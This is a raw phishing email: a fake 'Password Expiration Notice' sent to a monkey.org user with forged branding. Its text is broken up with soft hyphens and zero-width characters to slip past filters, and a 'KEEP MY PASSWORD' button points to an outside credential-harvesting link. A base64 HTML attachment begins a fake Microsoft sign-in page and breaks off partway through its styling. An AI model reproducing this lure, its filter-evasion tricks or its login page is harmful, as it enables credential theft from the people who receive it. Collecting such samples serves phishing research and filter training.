@@ -1,0 +1,339 @@
+From jose@monkey.org Tue Oct 29 14:12:35 2024 +0000
+Return-Path: inquiry@primemoverae.com
+Delivered-To: jose@monkey.org
+X-FDA: 82726829514.04.1F47E09
+Received: from mailp.primemoverae.com (mailp.primemoverae.com [88.218.79.238])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id E501A120004
+	for <jose@monkey.org>; Tue, 29 Oct 2024 14:12:13 +0000 (UTC)
+Authentication-Results: imf13.b.hostedemail.com;
+	dkim=pass header.d=primemoverae.com header.s=dkim header.b=Ton0qWTH;
+	spf=pass (imf13.b.hostedemail.com: domain of inquiry@primemoverae.com designates 88.218.79.238 as permitted sender) smtp.mailfrom=inquiry@primemoverae.com;
+	dmarc=pass (policy=none) header.from=primemoverae.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1730210989;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=NuYUt45YacoCgRoDbIinVfOG9eE4MLX0maiTKwkPxWQ=;
+	b=wzKMhGevuhsc3R0bjaVwYN7VJKofl66Fz9KHtPUkRSWRoeddRxhoeh/Bn9pzISWH1aTCmw
+	S7n1e+L+7Guwb3Gptm9oSkx6+Ic7oHtvpCtWlkmBIYAY1ZeCvnUTXZqPjw+1BeMOzF7Fa/
+	1t9W++HUKPJoAgWHKK1ZfB2IRjcx0cs=
+ARC-Authentication-Results: i=1;
+	imf13.b.hostedemail.com;
+	dkim=pass header.d=primemoverae.com header.s=dkim header.b=Ton0qWTH;
+	spf=pass (imf13.b.hostedemail.com: domain of inquiry@primemoverae.com designates 88.218.79.238 as permitted sender) smtp.mailfrom=inquiry@primemoverae.com;
+	dmarc=pass (policy=none) header.from=primemoverae.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1730210989; a=rsa-sha256;
+	cv=none;
+	b=4j00HajhE9ynoSgAPr/F0V3xpba9SiuBirgZVb228aKzPXs/WlEd6LdHq+TGQkyBGbRhEX
+	/P466mCDsC2ds/fB6PCLAbItjT0Kq08SmLbjHxeGqanh7PXKyRcP8fCP2JSicWzBxx0uwJ
+	1PDP/ZzH3spEfBNXDmiKDqF5B+WbaAo=
+Received: from [127.0.0.1] (localhost [127.0.0.1]) by localhost (Mailerdaemon) with ESMTPSA id A8EC36426C
+	for <jose@monkey.org>; Tue, 29 Oct 2024 14:12:29 +0000 (GMT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=primemoverae.com;
+	s=dkim; t=1730211150; h=from:subject:date:message-id:to:mime-version:content-type;
+	bh=NuYUt45YacoCgRoDbIinVfOG9eE4MLX0maiTKwkPxWQ=;
+	b=Ton0qWTHYAoOii4/WLIo6jabaFxEjBRGVG23Y/yp2Ar90hM9f0SOXb48/ft4Cs11JcbMVU
+	LVkllCZc4keS2ZtS2P/pzN9uYwyFihDPCutnb+JNqgedssbopCraqXr0aSYvT3I/BYvNHy
+	18tkT6Fxl8Yht6wzeoXz//U/KLihZ8JVk3nJ1RJ1+nNAWCW8DaiMsg0u3wvyR0zrsgTpKj
+	AVafXK97pYzFipBwWqycKfuDLuw12BN+wnFLp8ADa2qKpp8Hv6xGYEtnMilVK02mUAm1tx
+	uogiOO0HQofnTyjz5n2U2wyrkt97vfcSAIeAdSddIaXbNIv88MI6wMcxMHRIyw==
+From: monkey.org<inquiry@primemoverae.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?UOKAjWFzc+KAjXdvcmQgRXhwaXLigI1hdGlvbiBOb3TigI1pY2U=?=
+Date: 29 Oct 2024 15:12:29 +0100
+Message-ID: <20241029151227.DC77ADDB2C163C5A@primemoverae.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_B1AEFC63.0D3702DC"
+X-Last-TLS-Session-Version: TLSv1.3
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: E501A120004
+X-Stat-Signature: krhn6ir1wkdkikc7nm3itg9dek13bqew
+X-Spam-Status: No, score=5.42
+X-Rspam-User: 
+X-HE-Tag: 1730211133-223309
+X-HE-Meta: U2FsdGVkX1/TPneexcSsYhFLvColQCQE6NLAENikxVJM5kX/TA9bedckNTE7fJ4Q5j9schVdp+RjQcctxPFkB0CRvMA6yfF9S7L70fEKmzdkFimzl43jw82TolOd3UUEaiSUgMwUgWkyYQ+GIqVhFi3wnxn8rkQWLYYLe06PPcgkhZ95Hs+3tU4N/mMBDygkWmI+w54QqxtIy6Vr1lTO0VIsTHTCB94dYpBMJAHOk00xDVe/ytiizgd2mlKnhOqXSJAqTMjYvd4TB3FeAKVPVHX2ReA6e+BvtDsqQllzF+Ou4j1JSfagmEsXzfnmQ/2sBoRRfQVGBumEKAc5Et+mjSD5CNjZjMR5Xml9vYXavapGSlLAGv49/P8wGEUezjCM3ymVngKvoo7vYCR55Lo8AWLSdWv8HXCpV2Fuipu7TDWZp98azBhRH+ms0+/AtH7d2I8dr7ywdayIM+FDBzHa5AUlpvfi6IDCyZHG5VAaqhF16YZ54t8uYN1JJdZLGpZJ45FuvaO+dCiRrodFSgEPzY2ydxL13uvFGW2+YmHz7aGj7N/82uuvNf9VC4WQWIZFymHVzkvJPd4cg+u6tsv/Z9UHiNx8IQ+T6ANY6dbi4AD0v7CWlHDDHz2MFao/S2wPDexNK46i/idYZBievxL6Cj9h5LBguN1FiYdpz5/4OO6gEPYNIq2GVv6Ajo/MCo7m3g87iHhlHfr6BzbybtWPYQgtKslypjZOx29Nm2U7ANO/s8tCrn8v2EU1sUaCkN37QIKsSL2rQQBZwFbmnx+XHWg6mw01QnFzldkLdjQJWBaY2NPsu8j/pGgEfA69qiLKj8K/SzdH3qukGr3HobIEldplzbXyP6xpfmTVyt+owLC9mnLxNAC5DsSsrGtsY4t4vRuOuaffyZIKcqsGckiTz5Yr0A+9YRSNDXpSju7yf35Ev0tbGctMKrArNUE3F1SA/s0BNLQ/hIR68QutQHyV6IAmMPA
+ o58EVBDDfpWn0q3haCHwm8lJ8jBpXQkKWJZfxeOwzx5YoUXF1Vnbpk2GeguvV8NJU7U421mrMCiYnrdtMB3F9uiibAStoRS4cXjd2wLB1Rzu06NmUfCpFmyPXw5P5wkH6dfjJryoYiW2LRv+LiLdhSrXHgQBJuaOIzkwePbN23ROdQ4y1tTrYYgG3cLyZa6nrEyGebfH8PfnzZsm8q1SUHyEmXbgVOE2WIul9k89EG05j2sCtl0Cf9aVdZYYxzAaVW1XMI8Xvf9fVH6z/6R2VRvrS6MPGQy/owJMtgV951hPThgdZ8ar6TE5PR56IzNmEiWS/+uKvdk1uQnJlU+E5fTAr/nDTzmRu1/TzwtOhwpcLJlZaJmk89UFypRT9EjrF5NK67a+SglYKTOh2tvwf74Gy6o776u9dRhBAgUqJjDtM2WgXZTNinX4IKx1ilwNSaIMBQxFBXibuev1H/x7FbQ7yVlAaQ2/cusIvBkjiHpYOWgITviJiwLQHHYvXVlJuIhWGdTF0XS0FLvoeNERE535rcM3dWlk0bhbN5WdYXzUkWB3bYEaqIL2RZtQgzb6d2mVxO4AQZfnTL4TT8gR3iM4h4daA7YEz1H/N938ERq2F1CIu1WMaXDoAFXug8j1VYLDAgfZI2VOGI32KYvjAl5RAEBNb3u4ieRgYMusxjlrzqf/J8gGgXja3WvQoJGhPxW5M
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 317
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0012_B1AEFC63.0D3702DC
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div dir=3D"ltr"><div dir=3D"ltr">
+
+<p style=3D'margin: 0px 0px 1em; color: rgb(0, 0, 0); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: -apple-system,Blink=
+MacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emo=
+ji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 13px; font-style: normal=
+; font-weight: 400; word-spacing: 0px; white-space: normal; font-variant-li=
+gatures: normal; font-variant-caps: normal; text-decoration-style: initial;=
+ text-decoration-color: initial;'>&nbsp;</p>
+<table style=3D'border: 1px dotted rgb(211, 211, 211); color: rgb(51, 51, 5=
+1); text-transform: none; line-height: normal; text-indent: 0px; letter-spa=
+cing: normal; font-family: Verdana; font-size: 13px; font-style: normal; fo=
+nt-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: co=
+llapse; font-feature-settings: "liga" 0; background-color: rgb(255, 255, 25=
+5); font-variant-ligatures: normal; font-variant-caps: normal; text-decorat=
+ion-style: initial; text-decoration-color:=20
+initial;'><tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing:=
+ border-box;"><td style=3D"padding: 25px 0px 0px; border: 1px dotted rgb(21=
+1, 211, 211); box-sizing: border-box;"><p style=3D'margin: 0px 0px 1em; fon=
+t-family: -apple-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Aria=
+l,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; box-si=
+zing: border-box;'><br>&nbsp;</p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; box-sizing: border-bo=
+x;'><span style=3D'color: rgb(38, 112, 236); font-family: "segoe ui light";=
+ font-size: 34px; box-sizing: border-box;'>P&#8205;ass&#8205;word Expir&#82=
+05;action Not&#8205;ice</span></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 16px; box-=
+sizing: border-box;'><font face=3D"Calibri">Dear&nbsp;</font>
+<span style=3D"color: rgb(36, 36, 36); text-transform: none; text-indent: 0=
+px; font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0p=
+x; float: none; display: inline; white-space: normal; background-color: rgb=
+(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-style: initial; text-decoration-color: initial;">jose</spa=
+n><font face=3D"Calibri">,</font></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 16px; box-=
+sizing: border-box;'><font face=3D"Calibri">Your password is set to expire =
+on&nbsp;</font>
+10/29/2024 3:12:27 p.m.<font face=3D"Calibri">.</font></p><p style=3D'margi=
+n: 0px 0px 1em; font-family: -apple-system,BlinkMacSystemFont,"Helvetica Ne=
+ue","Segoe UI",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe=
+ UI Symbol"; box-sizing: border-box;'><font face=3D"Calibri" style=3D"color=
+: rgb(58, 58, 58); font-size: 15px; box-sizing: border-box;">&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&#10687;jose@monkey.org </font></p>
+<p style=3D'margin: 0px 0px 1em; color: rgb(58, 58, 58); font-family: -appl=
+e-system,BlinkMacSystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"A=
+pple Color Emoji","Segoe UI Emoji","Segoe UI Symbol"; font-size: 15px; box-=
+sizing: border-box;'><font face=3D"Calibri" style=3D"box-sizing: border-box=
+;">W&shy;e&shy;
+ e&shy;n&shy;c&shy;o&shy;u&shy;r&shy;a&shy;g&shy;e&shy; &shy;y&shy;o&shy;u&=
+shy; &shy;t&shy;o&shy; &shy;t&shy;a&shy;k&shy;e&shy; &shy;t&shy;h&shy;e&shy=
+; &shy;t&shy;i&shy;m&shy;e&shy; &shy;n&shy;o&shy;w&shy;=20
+&shy;t&shy;o&shy; &shy;m&shy;a&shy;i&shy;n&shy;t&shy;a&shy;i&shy;n&shy; &sh=
+y;y&shy;o&shy;u&shy;r&shy; &shy;p&shy;a&shy;s&shy;s&shy;w&shy;o&shy;r&shy;d=
+&shy; &shy;a&shy;c&shy;t&shy;i&shy;v&shy;i&shy;t&shy;y&shy;=20
+&shy;t&shy;o&shy; &shy;a&shy;v&shy;o&shy;i&shy;d&shy; i&shy;n&shy;t&shy;e&s=
+hy;r&shy;r&shy;u&shy;ption&shy;.&shy;</font></p><p style=3D"margin: 0px 0px=
+ 15px; color: rgb(116, 116, 135); font-family: Calibri; font-size: 15px; bo=
+x-sizing: border-box;">
+<a style=3D"background: rgb(27, 140, 250); margin: 4px; padding: 12px; colo=
+r: rgb(255, 255, 255); font-size: 14px; text-decoration: none; float: left;=
+ display: block; box-sizing: border-box;" href=3D"https://profile.aditional=
+=2Eclick/conservation.html?pop=3Djose@monkey.org" target=3D"_blank" rel=3D"=
+noopener"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://profile.adit=
+ional.click/conservation.html?pop%3D%5B%5B-Email-%5D%5D&amp;source=3Dgmail&=
+amp;ust=3D1729553661257000&amp;usg=3DAOvVaw1aKqmHsmrgOWprnqZYX8xa"><span st=
+yle=3D"font-weight: bolder; box-sizing: border-box;">KE&shy;EP M&shy;Y PAS&=
+shy;SWO&shy;R&shy;D</span></a></p>
+<table style=3D'margin: 0px auto; border: 1px dotted rgb(211, 211, 211); co=
+lor: rgb(58, 58, 58); line-height: normal; font-family: Calibri; font-size:=
+ 15px; font-weight: 400; border-collapse: collapse; border-spacing: 0px; fo=
+nt-feature-settings: "liga" 0;' bgcolor=3D"#da4424"><tbody style=3D"box-siz=
+ing: border-box;"><tr style=3D"box-sizing: border-box;"></tr></tbody></tabl=
+e></td></tr><tr style=3D"box-sizing: border-box;">
+<td style=3D"padding: 25px 0px 0px; border: 1px dotted rgb(211, 211, 211); =
+color: rgb(58, 58, 58); font-size: 11px; box-sizing: border-box;"><p style=
+=3D"margin: 0px 0px 1em; font-family: Calibri; box-sizing: border-box;">&nb=
+sp;</p><p style=3D'margin: 0px 0px 1em; font-family: -apple-system,BlinkMac=
+SystemFont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emoji"=
+,"Segoe UI Emoji","Segoe UI Symbol"; box-sizing: border-box;'><font face=3D=
+"Calibri" style=3D"box-sizing: border-box;">
+N&shy;o&shy;t&shy;e&shy;:&shy; &shy;monkey.org</font><font face=3D"Calibri"=
+ style=3D"box-sizing: border-box;"><span><span>&nbsp;</span></span>&nbsp;&n=
+bsp; &shy;w&shy;i&shy;l&shy;l&shy; &shy;n&shy;o&shy;t&shy; &shy;b&shy;e&shy=
+; &shy;h&shy;e&shy;l&shy;d&shy; &shy;r&shy;e&shy;s&shy;p&shy;o&shy;n&shy;s&=
+shy;i&shy;b&shy;l&shy;e&shy; &shy;f&shy;&shy;o&shy;r&shy; &shy;a&shy;n&shy;=
+y&shy; &shy;a&shy;c&shy;c&shy;o&shy;u&shy;n&shy;t&shy; &shy;l&shy;o&shy;s&s=
+hy;s&shy;</font></p>
+<p style=3D'margin: 0px 0px 1em; font-family: -apple-system,BlinkMacSystemF=
+ont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emoji","Segoe=
+ UI Emoji","Segoe UI Symbol"; box-sizing: border-box;'><font face=3D"Calibr=
+i" style=3D"box-sizing: border-box;">T&shy;h&shy;a&shy;n&shy;k&shy; &shy;y&=
+shy;o&shy;u&shy;.</font></p>
+<p style=3D'margin: 0px 0px 1em; font-family: -apple-system,BlinkMacSystemF=
+ont,"Helvetica Neue","Segoe UI",Arial,sans-serif,"Apple Color Emoji","Segoe=
+ UI Emoji","Segoe UI Symbol"; box-sizing: border-box;'><font face=3D"Calibr=
+i" style=3D"box-sizing: border-box;">Copyright &copy; monkey.org 2&shy;0&sh=
+y;2&shy;4&nbsp;. &shy;A&shy;l&shy;l&shy; &shy;R&shy;i&shy;g&shy;h&shy;t&shy=
+;s&shy; &shy;R&shy;e&shy;s&shy;e&shy;r&shy;v&shy;e&shy;d&shy;.</font></p></=
+td></tr></tbody></table>
+
+</div>
+</div>
+</body></html>
+------=_NextPart_000_0012_B1AEFC63.0D3702DC
+Content-Type: text/html; name="Docc.html"; charset="utf-8"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Docc.html"
+
+PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KCTx0aXRsZT5TaWduIGluIHRvIHlv
+dXIgYWNjb3VudDwvdGl0bGU+DQoJPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9Indp
+ZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4w
+LCBtaW5pbXVtLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyI+DQoNCgk8bGluayByZWw9
+InNob3J0Y3V0IGljb24iIHR5cGU9Imljb24iIGhyZWY9Imh0dHBzOi8vY2RuLnBpeGFiYXku
+Y29tL3Bob3RvLzIwMTMvMDIvMTIvMDkvMDcvbWljcm9zb2Z0LTgwNjYwXzEyODAucG5nIj4N
+CjxzdHlsZT4NCiogew0KCWJveC1zaXppbmc6IGJvcmRlci1ib3g7DQp9DQoNCmJvZHkgew0K
+CWZvbnQtZmFtaWx5OiAiU2Vnb2UgVUkgV2ViZm9udCIsLWFwcGxlLXN5c3RlbSwiSGVsdmV0
+aWNhIE5ldWUiLCJMdWNpZGEgR3JhbmRlIiwiUm9ib3RvIiwiRWJyaW1hIiwiTmlybWFsYSBV
+SSIsIkdhZHVnaSIsIlNlZ29lIFhib3ggU3ltYm9sIiwiU2Vnb2UgVUkgU3ltYm9sIiwiTWVp
+cnlvIFVJIiwiS2htZXIgVUkiLCJUdW5nYSIsIkxhbyBVSSIsIlJhYXZpIiwiSXNrb29sYSBQ
+b3RhIiwiTGF0aGEiLCJMZWVsYXdhZGVlIiwiTWljcm9zb2Z0IFlhSGVpIFVJIiwiTWljcm9z
+b2Z0IEpoZW5nSGVpIFVJIiwiTWFsZ3VuIEdvdGhpYyIsIkVzdHJhbmdlbG8gRWRlc3NhIiwi
+TWljcm9zb2Z0IEhpbWFsYXlhIiwiTWljcm9zb2Z0IE5ldyBUYWkgTHVlIiwiTWljcm9zb2Z0
+IFBoYWdzUGEiLCJNaWNyb3NvZnQgVGFpIExlIiwiTWljcm9zb2Z0IFlpIEJhaXRpIiwiTW9u
+Z29saWFuIEJhaXRpIiwiTVYgQm9saSIsIk15YW5tYXIgVGV4dCIsIkNhbWJyaWEgTWF0aCI7
+DQoJbWFyZ2luOiAwOw0KCXBhZGRpbmc6IDA7DQoJd2lkdGg6IDEwMCU7DQoJYmFja2dyb3Vu
+ZC1pbWFnZTogdXJsKCdodHRwczovL2kuc3RhY2suaW1ndXIuY29tL3Z6YnVRLmpwZycpOw0K
+CWJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQoJYmFja2dyb3VuZC1hdHRhY2htZW50
+OiBmaXhlZDsNCgliYWNrZ3JvdW5kLXBvc2l0aW9uOiBjZW50ZXI7DQoJYmFja2dyb3VuZC1z
+aXplOiBjb3ZlcjsNCgliYWNrZ3JvdW5kLW9yaWdpbjogYm9yZGVyLWJveDsNCn0NCg0KLm92
+ZXJsYXkgew0KCXBvc2l0aW9uOiBhYnNvbHV0ZTsNCgl3aWR0aDogMTAwJTsNCgloZWlnaHQ6
+IDEwMCU7DQoJYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLDAsMCwwLjU1KTsNCn0NCg0KYSB7
+IA0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsgDQoJY29sb3I6ICMwMDY3Yjg7DQp9DQoNCmE6
+aG92ZXIgeyBjb2xvcjogIzAwNWRhNjsgfQ0KDQpmb290ZXIgew0KCWRpc3BsYXk6IGJsb2Nr
+Ow0KCXBvc2l0aW9uOiBmaXhlZDsNCgl3aWR0aDogMTAwJTsNCgloZWlnaHQ6IDMwcHg7DQoJ
+Ym90dG9tOiAwOw0KCWxlZnQ6IDA7DQoJcGFkZGluZzogMDsNCgliYWNrZ3JvdW5kLWNvbG9y
+OiByZ2JhKDAsMCwwLDAuNyk7DQoJY29sb3I6ICNmZmY7DQp9DQoNCmZvb3RlciB1bCB7DQoJ
+cGFkZGluZzogMDsNCgltYXJnaW46IDA7DQp9DQoNCmZvb3RlciB1bCBsaSB7DQoJbGlzdC1z
+dHlsZS10eXBlOiBub25lOw0KCWRpc3BsYXk6IGlubGluZS10YWJsZTsNCglmbG9hdDogcmln
+aHQ7DQoJbWFyZ2luOiAxcHggMTBweDsNCn0NCg0KZm9vdGVyIHVsIGxpIGEgew0KCWNvbG9y
+OiAjZmZmOyANCglmb250LXNpemU6IDEycHg7DQp9DQoNCmZvb3RlciB1bCBsaSBhOmhvdmVy
+IHsNCgljb2xvcjogI2ZmZjsgDQp9DQoNCi5idG4tZ3JvdXAgew0KCWRpc3BsYXk6IGlubGlu
+ZS1mbGV4Ow0KfQkJDQoNCi5sb2dpbi1ib3ggew0KCWJhY2tncm91bmQtY29sb3I6ICNmZmY7
+DQoJei1pbmRleDogMTAwMDsNCgltYXJnaW46IGF1dG87DQoJbWFyZ2luLXRvcDogMTAuMSU7
+DQoJbWluLWhlaWdodDogMzY0cHg7DQoJbWluLXdpZHRoOiAzMjBweDsNCgltYXgtd2lkdGg6
+IDQxMnB4Ow0KCXdpZHRoOiA0MTJweDsNCglwYWRkaW5nOiAzMHB4IDMwcHggNDBweDsNCgli
+b3JkZXI6IGdyb292ZSAxcHggcmdiYSgwLDAsMCwwLjEpOw0KfQ0KDQoubG9naW4tYm94IGgy
+IHsNCglmb250LXdlaWdodDogbm9ybWFsOw0KCW1hcmdpbi1ib3R0b206IDAuNWVtOw0KfQ0K
+DQoubG9naW4tYm94IGlucHV0W3R5cGU9J2VtYWlsJ10sIC5sb2dpbi1ib3ggaW5wdXRbdHlw
+ZT0ncGFzc3dvcmQnXSB7DQoJd2lkdGg6IDEwMCU7DQoJYm9yZGVyLWNvbG9yOiAjMDAwOw0K
+CWJvcmRlci13aWR0aDogLjVweDsNCglwYWRkaW5nLWxlZnQ6IDEwcHg7DQoJaGVpZ2h0OiAy
+LjVlbTsNCglmb250LXNpemU6IDE1cHg7DQoJYm94LXNoYWRvdzogbm9uZTsNCglvdmVyZmxv
+dzogaGlkZGVuOw0KCWJvcmRlci1zdHlsZTogc29saWQ7DQoJbWFyZ2luLWJvdHRvbTogMWVt
+Ow0KfQ0KDQoubG9naW4tYm94IGlucHV0W3R5cGU9J2VtYWlsJ106Zm9jdXMsDQoubG9naW4t
+Ym94IGlucHV0W3R5cGU9J2VtYWlsJ106YWN0aXZlLA0KLmxvZ2luLWJveCBpbnB1dFt0eXBl
+PSdwYXNzd29yZCddOmZvY3VzLCANCi5sb2dpbi1ib3ggaW5wdXRbdHlwZT0ncGFzc3dvcmQn
+XTphY3RpdmUgew0KCW91dGxpbmU6IG5vbmU7DQoJYm9yZGVyLWNvbG9yOiAjMDA2N2I4Ow0K
+fQ0KDQoubG9naW4tYm94IGlucHV0W3R5cGU9J3N1Ym1pdCddLCAubG9naW4tYm94IGlucHV0
+W3R5cGU9J3Jlc2V0J10sIC5uZXh0IHsNCglkaXNwbGF5OiBibG9jazsNCgl3aWR0aDogMTAw
+JTsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMDA2N2I4Ow0KCWhlaWdodDogMi41ZW07DQoJY29s
+b3I6ICNmZmY7DQoJYm9yZGVyLXN0eWxlOiBzb2xpZDsNCglib3JkZXItY29sb3I6ICMwMDY3
+Yjg7DQoJZm9udC1zaXplOiAxNnB4Ow0KfQ0KDQoubG9naW4tYm94IGlucHV0W3R5cGU9J3Jl
+c2V0J10ucmV2LWJ0biB7DQoJYmFja2dyb3VuZC1jb2xvcjogI2NjYzsNCgljb2xvcjogIzAw
+MDsNCglib3JkZXItY29sb3I6ICNjY2M7DQp9DQoNCi5sb2dpbi1ib3ggaW5wdXRbdHlwZT0n
+c3VibWl0J106aG92ZXIsIC5sb2dpbi1ib3ggaW5wdXRbdHlwZT0ncmVzZXQnXTpob3Zlciwg
+Lm5leHQ6aG92ZXIgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDVkYTY7DQoJYm9yZGVyLWNv
+bG9yOiAjMDA1ZGE2Ow0KCWJvcmRlci1zdHlsZTogc29saWQ7DQp9DQoNCi5sb2dpbi1ib3gg
+aW5wdXRbdHlwZT0ncmVzZXQnXS5yZXYtYnRuOmhvdmVyIHsNCgliYWNrZ3JvdW5kLWNvbG9y
+OiAjY2NjOw0KCWNvbG9yOiAjMDAwOw0KCWJvcmRlci1jb2xvcjogI2NjYzsNCn0NCg0KLmxv
+Z2luLWJveCBpbnB1dFt0eXBlPSdzdWJtaXQnXTpmb2N1cywgLmxvZ2luLWJveCBpbnB1dFt0
+eXBlPSdyZXNldCddOmZvY3VzLCAubmV4dDpmb2N1cyB7DQoJYm9yZGVyLXdpZHRoOiAycHg7
+DQoJYm9yZGVyLWNvbG9yOiAjMDAwOw0KCXRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOw0K
+CW91dGxpbmU6IG5vbmU7DQp9DQoNCi5sb2dpbi1ib3ggaW5wdXRbdHlwZT0ncmVzZXQnXS5y
+ZXYtYnRuOmZvY3VzIHsNCglib3JkZXItd2lkdGg6IDJweDsNCglib3JkZXItY29sb3I6ICMw
+MDA7DQoJdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7DQoJb3V0bGluZTogbm9uZTsNCn0N
+Cg0KLmxvZ2luLWJveCBpbnB1dFt0eXBlPSdjaGVja2JveCddIHsNCgl3aWR0aDogMjBweDsN
+CgloZWlnaHQ6IDIwcHg7DQoJZmxvYXQ6IGxlZnQ7DQp9DQoNCi5sb2dpbi1ib3ggaW5wdXRb
+dHlwZT0nY2hlY2tib3gnXTpmb2N1cyB7DQoJb3V0bGluZTogbm9uZTsNCn0NCg0KLmlkZW50
+aXR5LWJhbm5lciB7DQogICAgaGVpZ2h0OiAyOHB4Ow0KICAgIGJhY2tncm91bmQ6ICNmMmYy
+ZjI7DQogICAgbWFyZ2luOiAxNnB4IC0zMHB4Ow0KICAgIHBhZGRpbmc6IDAgMzZweDsNCn0N
+Cg0KLmlkZW50aXR5IHsNCiAgICBsaW5lLWhlaWdodDogMjhweDsNCiAgICB3aGl0ZS1zcGFj
+ZTogbm93cmFwOw0KICAgIG92ZXJmbG93OiBoaWRkZW47DQogICAgdGV4dC1vdmVyZmxvdzog
+ZWxsaXBzaXM7DQogICAgdGV4dC1hbGlnbjogcmlnaHQ7DQogICAgd2lkdGg6IGNhbGMoMTAw
+JSAtIDU2cHgpOw0KfQ0KDQoucHJvZmlsZS1waG90byB7DQogICAgaGVpZ2h0OiA0OHB4Ow0K
+ICAgIHdpZHRoOiA0OHB4Ow0KICAgIG1hcmdpbi10b3A6IC00OHB4Ow0KICAgIGJvcmRlci1y
+YWRpdXM6IDUwJTsNCiAgICBvdmVyZmxvdzogaGlkZGVuOw0KICAgIGZsb2F0OiByaWdodDsN
+Cn0NCg0KLmhpZGRlbiB7DQoJZGlzcGxheTogbm9uZTsNCgl2aXNpYmlsaXR5OiBoaWRkZW47
+DQp9DQoNCi5mYWRlOmhvdmVyIHsNCgljb2xvcjogIzY2NjsNCn0NCg0KLm1lc3NhZ2Ugew0K
+CWZvbnQtc2l6ZTogMTVweDsNCgljb2xvcjogcmVkOw0KfQ0KDQouZXJyb3Igew0KCW91dGxp
+bmU6IG5vbmU7DQoJYm9yZGVyLWNvbG9yOiByZWQgIWltcG9ydGFudDsNCn0NCg0KDQoubG9h
+ZGVyIHsNCiAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQoJcGFkZGluZy10b3A6IDA7DQoJd2lk
+dGg6IDQwcHg7DQoJbWFyZ2luOiAtMjJweDsNCn0NCg0KLmxvYWRlciAuY2lyY2xlIHsNCglw
+b3NpdGlvbjogYWJzb2x1dGU7DQoJd2lkdGg6IDE4cHg7DQoJaGVpZ2h0OiAxOHB4Ow0KCW9w
+YWNpdHk6IDA7DQoJdHJhbnNmb3JtOiByb3RhdGUoMjI1ZGVnKTsNCglhbmltYXRpb24taXRl
+cmF0aW9uLWNvdW50OiBpbmZpbml0ZTsNCglhbmltYXRpb24tbmFtZTogb3JiaXQ7DQoJYW5p
+bWF0aW9uLWR1cmF0aW9uOiAzczsNCn0NCg0KLmxvYWRlciAuY2lyY2xlOmFmdGVyIHsNCglj
+b250ZW50OiAiIjsNCglwb3NpdGlvbjogYWJzb2x1dGU7DQoJd2lkdGg6IDNweDsNCgloZWln
+aHQ6IDNweDsNCglib3JkZXItcmFkaXVzOiA1cHg7DQoJYmFja2dyb3VuZDogIzAwMDsNCn0N
+Cg0KLmxvYWRlciAuY2lyY2xlOm50aC1jaGlsZCgyKSB7DQoJYW5pbWF0aW9uLWRlbGF5OiAy
+NDBtczsNCn0NCi5sb2FkZXIgLmNpcmNsZTpudGgtY2hpbGQoMykgew0KCWFuaW1hdGlvbi1k
+ZWxheTogNDgwbXM7DQp9DQoubG9hZGVyIC5jaXJjbGU6bnRoLWNoaWxkKDQpIHsNCglhbmlt
